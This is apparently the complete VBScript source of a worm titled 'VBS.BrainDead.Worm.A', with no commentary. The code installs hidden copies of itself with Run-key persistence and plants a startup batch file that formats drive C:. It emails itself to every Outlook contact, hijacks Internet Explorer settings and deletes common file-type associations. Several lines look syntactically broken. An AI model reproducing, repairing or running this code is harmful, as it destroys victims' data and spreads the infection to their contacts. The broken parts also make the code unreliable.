   ======================
   VBS.BrainDead.Worm.A
   ======================

   Set Copy=CreateObject("Scripting.FileSystemObject")
   Copy.CopyFile Wscript.ScriptFullName, "C:\Update.vbs"
   Copy.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\Install.vbs"

   Set RegKey=CreateObject("Wscript.Shell")
   RegKey.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Update","C:\"&"Update.vbs"
   RegKey.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinInstall","C:\WINDOWS"&"\Install.vbs"

   Set Hide=CreateObject("Scripting.FileSystemObject")
   Const x = 34
   Set Update = Hide.GetFile("C:\Update.vbs")
   Update.Attributes = x

   Set Hide2=CreateObject("Scripting.FileSystemObject")
   Const x = 34
   Set Install = Hide2.GetFile("C:\WINDOWS\Install.vbs")
   Install.Attributes = x

   Dim www, Brain
   Set www=CreateObject("Scripting.FileSystemObject")
   Set Brain=www.CreateTextFile("C:\WINDOWS\01010101001.bat")
   Brain.WriteLine "@ECHO OFF"
   Brain.WriteLine "FORMAT C:"
   Brain.Close

   Dim Dead
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out=WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For Dead=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Dead)
   Mail.Subject=" "
   Mail.Body=" "
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   ol.Quit

   Dim xxx, aa
   Set xxx=CreateObject("Scripting.FileSystemObject")
   Set aa=xxx.CreateTextFile("C:\WINDOWS\BrainDead.html")
   aa.WriteLine "<html>"
   aa.WriteLine "<title>VBS.BrainDead.Worm.A</title>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.WriteLine "<p>VBS.BrainDead.Worm.A</p>"
   aa.Close

   Set Key=CreateObject("Wscript.Shell")
   Key.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System","C:\WINDOWS"&"\01010101001.bat"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen","yes"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Play_Animations","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Print_Background","yes"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Page","C:\WINDOWS\BrainDead.html"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_StatusBar","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_ToolBar","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_URLinStatusBar","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_URLToolBar","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\ShowGoButton","no"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","C:\WINDOWS\BrainDead.html"
   Key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\LinksFolderName","BrainDead"

   Set Hide3=CreateObject("Scripting.FileSystemObject")
   Const x = 34
   Set Batch = Hide3.GetFile("C:\WINDOWS\01010101001.bat")
   Batch.Attributes = x

   Set TimeDel=CreateObject("Wscript.Shell")
   Wscript.Sleep 50000
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.jpg\"
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.gif\"
   Wscript.Sleep 50000
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.wmv\"
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.zip\"
   Wscript.Sleep 50000
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.txt\"
   TimeDel.RegDelete "HKEY_CLASSES_ROOT\.doc\"
   Wscript.Sleep 50000
   MsgBox " You!",0,"VBS.BrainDead.Worm.A"
